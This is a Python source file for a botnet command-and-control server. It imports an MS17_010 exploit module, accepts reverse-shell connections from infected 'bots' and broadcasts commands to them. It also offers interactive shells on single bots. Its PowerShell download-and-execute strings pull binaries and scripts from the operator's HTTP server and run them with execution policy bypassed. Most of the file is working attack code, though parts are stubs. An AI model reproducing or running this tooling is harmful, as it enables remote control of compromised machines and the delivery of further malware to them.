"""
# TODO Fix B2A
"""


import MS17_010
from Utilities import *
import socket
import threading
import os
os.chdir(os.path.abspath('/tmp/'))
#
import http.server
import socketserver


# Theses are the IPs that are allowed to connect.
whiteList = ['10.1.1.1','10.1.1.7']


bots=[]
PingBots=[]
myip="192.168.1.8"
father = myip
# You have to start httpd on this port:
httpPort=6080
# This port gets all shell sessions
port = 6061
# This port gets the "ping" sessions
pingPort=6066
# Debug mode
debug = 0
# The location of the main http server
HTTPServerLocation="/var/www/html/mb"
HTTPServerMS17Location="/s"
HTTPServerOptionLocation=HTTPServerLocation+"/os"

"""
Start listening
"""
def start_listing(port):
    print("Server listening on port "+str(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen(2)
    sock.settimeout(2)
    return sock

# """
# Receive buffers
# """
# def get_message(conn):
#     print("get_message started")
#     while True:
#         try:
#             data = conn.recv(6282).decode()
#             if len(data) != 0:
#                 print(data[:-1])
#         except:
#             # todo - errors
#             pass
#
# def send_message(conn):
#     print("send_message started")
#     while True:
#         try:
#             message = input(">").strip("\n")
#             message = message + "\r\n"
#             # end shell mode
#             if message == "exit":
#                 break
#             if len(message) != 0:
#                 conn.send(message.encode('utf-8'))
#         except:
#             # todo - errors
#             pass





# def upload_binary(bot):
#     #Setup
#     conn = bot[0]
#     addr = bot[1]
#     ip = conn.getpeername()[0]
#     port = conn.getpeername()[1]
#     # ask for the file location
#     binLocation = s_input("Binary? (Absolute path) Ex: /root/winbin/wget.exe")
#     # ask for an ip
#     lhost = s_input("Local host? [0.0.0.0]")
#     # copy the file to tmp.
#     execute_command("cp "+binLocation+" /tmp/")
#     # proc is needed to kill it after the upload process
#     # This http server is at /tmp
#     proc = execute_command("python -m SimpleHTTPServer 8080")
#     #out, err = proc.communicate()
#     location = binLocation.split("/")
#     filename = location[-1]
#     #command = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://"+lhost+":8080/"+filename+"','"+filename+"');"
#     #command = "PowerShell Invoke-WebRequest 'http://"+lhost+":8080/"+filename+"' -OutFile ‘C:\wget.exe’"
#     # Send and print the outputs
#     print("Uploading ..")
#     try:
#         conn.settimeout(2)
#         conn.send(command.encode('utf-8'))
#         conn.recv(6282)
#         conn.recv(6282)
#     except:
#         if debug:
#             print("Failed!")
#         pass
#     proc.kill()
#     pass


"""
LocalLocation is the location on the server
RLocation is the file name for the bot (Use $env:temp/RLocation -> $env:temp is)

The idea is to run python HTTP service in the server. (I think i will just run it always)
Send command to download from my server..
execute

# TODO Try to find a way to make this happen.

"""
def B2A(LocalLocation,sendANDrun):
    # Get the last part in the path which should be the just name of the file
    # Example: http://myip.com/anything/v.exe
    # Then RLocation will be -> RLocation = $env:temp/v.exe
    RLocation = "$env:temp/"+LocalLocation.split("/")[-1]
    # Run an http server as a thread
    # httpserver_thread = threading.Thread(target=httpserver, args=(httpPort,))
    # httpserver_thread.daemon = True
    # httpserver_thread.start()

    # setting up the command
    command = "powershell.exe $env:temp/wget.exe http://"+myip+":"+str(httpPort)+"/"+LocalLocation+" -o "+RLocation
    command = command + "\r\n"

    # do this for all bots
    for bot in bots:

        # Setup all needed parameters
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        port = addr[1]

        # Try to send command
        try:
            SR(command,conn,6282,0)
            if sendANDrun == 'yes' and sendANDrun == 'y' and sendANDrun == 'Yes':
                # To execute
                command = "./"+RLocation
                command = command + "\r\n"
                SR(command,conn,6282,0)
            print(str(ip)+" Received")
        except:
            if debug:
                print("Error at one2all(command) when sending to "+str(ip))


"""
^^^^^^^ Handler
"""
def B2AHandler():
    try:
        LocalLocation = input("File location:").strip("\n")
        sendANDrun = input("Upload and run?").strip("\n")
    except KeyboardInterrupt:
        return
    B2A(LocalLocation,sendANDrun)


"""
Send a command to all bots
"""
def C2A(command):
    for bot in bots:
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        port = addr[1]
        print("Sending to ")
        print(bot)
        try:
            SR(command,conn,6282,0)
            print(str(ip)+" Received")
        except KeyboardInterrupt:
            return
        except:
            if debug:
                print("Error in C2A(command) when sending to "+str(ip))


"""
Handles my inputs
"""
def C2AHandler():
    while True:
        try:
            # Get input
            Command = s_input("C2A:~")
            # If it's exit get out
            if Command == 'exit':
                return
            # Are you sure?
            condition = s_input("Do you want to send ->'"+Command+"' to all bots? [y/N]")
            # Make sure that you want to send it.
            if condition == "y" or condition == "Y":
                print("Sending..")
                # Before sending it
                # Fix add newline to execute the command
                Command = Command + "\r\n"
                C2A(Command)
            else:
                print("No data has sent")
                #
        except KeyboardInterrupt:
            return
        except:
            print("Error in C2AHandler")
            return

"""
Send one command and recv "r_buffer" size of buffer.
"""
def SR(command,conn,r_buffer,waitForData):
    try:
        conn.send(command.encode('utf-8'))
        if waitForData:
            return conn.recv(r_buffer)
    except KeyboardInterrupt:
            return
    except:
            return

"""
It will downlaod a script from /mb/os then run it on one bot or all of them.
Filename: the name of the file in /var/www/html/mb/os.


TODO: Make sure that the files have different names.
"""
def uploadRun(bot,filename):
    # Setup the command.

    # This command is just to upload the script.
    string = "powershell "
    string += "$url = http://"+father+"/mb/os/"+filename+"; "
    string += "$save_dir = $env:temp; "
    string += "$Location = '' + $save_dir + '\\' + '"+filename+"'; "
    string += "$wgetBinLocation = '' + $save_dir + '\\ wget.exe'; "
    string += "Start-Process -FilePath $wgetBinLocation -Args '$url -O $Location' -passthru -NoNewWindow -Wait; "
    command = string + "\r\n"

    # Execution command
    executionString = "Powershell -ExecutionPolicy ByPass -File '$env:temp\\'"+filename+"' "

    # When you target all bots
    if bot is None:
        # The commands:
        # wget should be always at $env:temp ALWAYS!!!!!!!!!
        # Execution
        C2A(command)
        command = executionString + "\r\n"
        # Execute the script.
        C2A(command)
        pass
    else:
        addr = bot[1]
        conn = bot[0]
        ip = addr[0]
        # Execution
        try:
            # Upload.
            SR(command,conn,6282,0)
            command = executionString + "\r\n"
            # Execute the script.
            SR(command,conn,6282,0)
            print(str(ip)+" uploadRun() - Received")
        except KeyboardInterrupt:
            return
        except:
            if debug:
                print("Error in uploadRun(bot,filename) when sending to "+str(ip))

"""
Options mode
Which will use a pre made http server that will have all scripts in order.
so option 1 will be 1.ps1 at the dir on /var/www/mb
if u want to add a new script just add it to /var/www/mb

"""
def options():
    # It will use this C2A() method
    pass


"""
Options mode handler
"""
def optionsHandler():
    # list all options u have at HTTPServerOptionLocation
    #
    proc = execute_command("ls "+HTTPServerOptionLocation)
    # Pyhton3 .decode("utf-8") to proc.communicate()[0] since it will return b'sting'
    options = str(proc.communicate()[0].decode("utf-8")).split(' ')
    # Put all options in a list
    lsitOfOptions = []
    for option in options:
        lsitOfOptions.append(option)

    while True:
        try:
            print("Print all options")
            for option in options:
                print(option)
            # Get input
            filename = s_input("Options:~")
            towho = s_input("Enter a port or all:~")
            list()
            print("Choose one of the ports or all")
            bot = find_bot(towho)
            if len(bot) <= 0:
                bot = None
            if filename not in lsitOfOptions:
                print("Choose another option")
                continue
            # If it's exit get out
            if filename == 'exit':
                return
            # Are you sure?
            condition = s_input("Do you want to send ->'"+filename+"' to all bots? [y/N]")
            # Make sure that you want to send it.
            if condition == "y" or condition == "Y":
                print("Sending..")

                # This function will handle the rest
                # Read its description if u want to understand it.
                uploadRun(bot, filename)
            else:
                print("No data has sent")
                #
        except KeyboardInterrupt:
            return
        except:
            print("Error in C2AHandler")
            return


"""
Read from the console and send it to a specific bot
It will be called by Talk(), Talk() will receive all data from the bot, this function will send commands.
"""
def send_message(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    print("send_message started")
    while True:
        try:
            message = input("").split("\n")[0]
            # end shell mode
            if message == "exit shell":
                break
            message = message + "\r\n"
            if len(message) != 0:
                conn.send(message.encode('utf-8'))
        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            return
        except:
            # todo - errors
            print("Error")
            return -1

"""
Start shell mode
"""
def talk(bot):
    #Setup
    conn = bot[0]
    addr = bot[1]
    ip = conn.getpeername()[0]
    port = conn.getpeername()[1]

    # start a new thread to send strings/commands.
    send_message_thread = threading.Thread(target=send_message, args=(bot,))
    send_message_thread.daemon = True
    send_message_thread.start()
    conn.settimeout(2)
    while send_message_thread.isAlive():
        try:
            data = conn.recv(6282).decode().strip("\n")[:-1]
            if len(data) != 0:
                print(data)
        except:
            pass


"""
Remove all dead bots in "bots" list
"""
def refreshBots():
    for bot in bots:
        try:
            conn = bot[0]
            # If bot is not alive
            if '2049' == str(conn.type):
                bots.remove(bot)
        except:
            pass

"""
Remove all dead bots in "PingBots" list
"""
def refreshPingBots():
    for bot in PingBots:
        try:
            conn = bot[0]
            # If bot is not alive
            if '2049' == str(conn.type):
                bots.remove(bot)
        except:
            pass

"""
print all bots
"""
def list():
    #[conn, addr]
    refreshBots()
    for bot in bots:
        try:
            addr = bot[1]
            conn = bot[0]
            ip = addr[0]
            port = addr[1]

            # TODO Test this Theory: This "conn.send()" method might kill the client.
            # Why? I guess this might timeout the Send() method in the other side.
            # Because it the other side has to send the output, right?
            try:
                conn.send("\r\n".encode('utf-8'))
            except:
                print("A Client has disconnected")
                continue
            print(str(ip)+" at "+str(port))
        except:
            pass

def auth(IPs):
    IPs = IPs.replace('\n', '#').replace(':', '#').split('#')
    for IP in IPs:
        IP = IP.strip(' ')
        if IP in whiteList:
            return 1
    return 0

"""
Stop
"""
def kill_all():
    for bot in bots:
        print(bot)

"""
Find a match
name = ip
"""
def find_bot(portNumber):
    for bot in bots:
        addr = bot[1]
        port = addr[1]
        ip = bot[0].getpeername()[0]
        if portNumber == str(port):
            return bot
    return []

def help(type):
    if type == 0:
        print("list      List all bots"
              "C2A       Send a Command 2 All bots"
              "B2A       Send a Binary/Shellcode 2 All bots"
              "C2I       Send a Command 2 one IP"
              "B2I       Send a Binary/Shellcode 2 one IP")
    pass

"""
Wake up dead bots, by sending "1111" to the bot.
#TODO Fix "1111"! just use one byte!!!
"""
def ping():
    # [pingConn, pingAddr]
    refreshPingBots()
    for bot in PingBots:
        print("ping()")
        pingConn = bot[0]
        pingAddr = bot[1]
        print(pingAddr)
        sendthis = "111111\n\0"
        print(sendthis)
        SR(sendthis,pingConn,1024,0)

"""
Console
"""
def console():
    while 1:
        Command = s_input("MB:~")
        if len(Command) <= 0:
            continue
        # if command is a valid ip
        bot = find_bot(Command)
        # if bot exists.
        if len(bot) >= 2:
            talk(bot)
            continue
        elif Command == "list":
            list()
        # Send a command to all bots
        elif Command == "help":
            help(0)
        # Send a command to all bots
        elif Command == "C2A":
            C2AHandler()
        # Send a binary to all bots
        elif Command == "B2A":
            B2AHandler()
            pass
        elif Command == "C2I":
            pass
        elif Command == "B2I":
            list()
            name = s_input("Who?")
            bot = find_bot(name)
            #upload_binary(bot)
        elif Command == "ping" or Command == "PING":
            ping()
        elif Command == "exploits" or Command == "EXPLOITS" or Command == "EXP" or Command == "exp":
            listExploits()
        elif Command == "options" or Command == "Options":
            optionsHandler()
        elif Command == "exit":
            break
        else:
            print("To choose a session, list all bots then enter the"
                  "port number of the bot to start a shell")
            pass

def pingSockFun(consoleT,pingSock):
    while consoleT.isAlive():
        try:
            pingConn, pingAddr = pingSock.accept()
            print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")

            # Auth
            IPs = pingConn.recv(6282).decode()
            if auth(IPs):
                SR("111111\n\0", pingConn, 1024, 0)
                PingBots.append([pingConn, pingAddr])
            else:
                pass
                print("Not valid")
                pingSock.close()
        except:
            pass
    pingSock.close()

def mainSockFun(consoleT,mainSock):
    while consoleT.isAlive():
        try:
            conn, addr = mainSock.accept()
            print(str(addr[0])+":"+str(addr[1])+" has connected")

            # data = conn.recv(6282).decode().strip("\n")[:-1]
            # if len(data) != 0:
            #     print(data)

            bots.append([conn, addr])
        except:
            pass
    mainSock.close()

def main():
    print("Start httpd!")
    global bots
    mainSock = start_listing(port)
    pingSock = start_listing(pingPort)
    consoleT = threading.Thread(target=console, args=())
    consoleT.daemon = True
    consoleT.start()

    tr1 = threading.Thread(target=pingSockFun, args=(consoleT,pingSock,))
    tr2 = threading.Thread(target=mainSockFun, args=(consoleT,mainSock,))
    tr1.daemon = True
    tr2.daemon = True
    tr2.start()
    tr1.start()

    tr1.join()
    tr2.join()

if __name__ == '__main__':
    pass
    #getIP()
    main()
